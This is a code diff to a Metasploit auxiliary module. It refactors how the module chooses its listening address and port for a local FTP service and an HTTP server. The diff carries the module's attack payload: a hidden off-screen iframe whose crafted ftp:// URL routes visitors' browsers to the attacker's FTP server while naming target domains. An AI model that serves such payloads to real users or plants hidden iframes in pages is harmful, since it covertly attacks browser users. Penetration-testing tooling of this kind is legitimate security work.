@@ -55,7 +55,7 @@ class MetasploitModule < Msf::Auxiliary
   #
   def run
     start_service
-    print_status("Local FTP: #{Rex::Socket.to_authority(srvhost_addr, srvport)}")
+    print_status("Local FTP: #{lookup_lhost}:#{datastore['SRVPORT']}")
     start_http
     @http_service.wait
   end
@@ -68,12 +68,17 @@ class MetasploitModule < Msf::Auxiliary
     # Ensture all dependencies are present before initializing HTTP
     use_zlib
 
-    comm = _determine_server_comm(bindhost)
+    comm = datastore['ListenerComm']
+    if comm.to_s == 'local'
+      comm = ::Rex::Socket::Comm::Local
+    else
+      comm = nil
+    end
 
     # Default the server host / port
     opts = {
-      'ServerHost' => bindhost,
-      'ServerPort' => datastore['HTTPPORT'], # can't use bindport because this wants HTTPPORT not SRVPORT
+      'ServerHost' => datastore['SRVHOST'],
+      'ServerPort' => datastore['HTTPPORT'],
       'Comm' => comm
     }.update(opts)
 
@@ -106,12 +111,24 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Using URL: #{proto}://#{opts['ServerHost']}:#{opts['ServerPort']}#{uopts['Path']}")
 
     if opts['ServerHost'] == '0.0.0.0'
-      print_status("Local IP: #{proto}://#{Rex::Socket.source_address('1.2.3.4')}:#{opts['ServerPort']}#{uopts['Path']}")
+      print_status(" Local IP: #{proto}://#{Rex::Socket.source_address('1.2.3.4')}:#{opts['ServerPort']}#{uopts['Path']}")
     end
 
     # Add path to resource
     @service_path = uopts['Path']
     @http_service.add_resource(uopts['Path'], uopts)
+  end
+
+  #
+  # Lookup the right address for the client
+  #
+  def lookup_lhost(c = nil)
+    # Get the source address
+    if datastore['SRVHOST'] == '0.0.0.0'
+      Rex::Socket.source_address(c || '50.50.50.50')
+    else
+      datastore['SRVHOST']
+    end
   end
 
   #
@@ -194,7 +211,7 @@ class MetasploitModule < Msf::Auxiliary
       domains = datastore['TARGET_DOMAINS'].split(',')
       iframes = domains.map do |domain|
         %Q|<iframe style='position:fixed;top:-99999px;left:-99999px;height:0;width:0;'
-                src='ftp://user%40#{srvhost_addr}%3A#{srvport}%2Findex.html%23@#{domain}/'>
+                src='ftp://user%40#{lookup_lhost}%3A#{datastore['SRVPORT']}%2Findex.html%23@#{domain}/'>
         </iframe>|
       end
 
